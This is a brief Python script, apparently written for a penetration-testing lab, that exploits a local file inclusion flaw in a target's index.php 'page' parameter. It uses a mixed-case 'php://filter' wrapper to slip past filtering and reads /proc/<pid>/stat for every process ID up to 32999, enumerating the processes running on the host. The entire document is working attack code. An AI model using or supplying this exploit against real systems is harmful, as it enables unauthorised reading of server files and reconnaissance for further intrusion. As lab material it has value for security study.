import requests

target = "10.129.126.122"
url = ""

for i in range(1,33000):
        url = "http://"+target+"/index.php?page=pHp://FilTer/resource=/proc/" + str(i) + "/stat"
        r = requests.get(url)
        print(r.text)
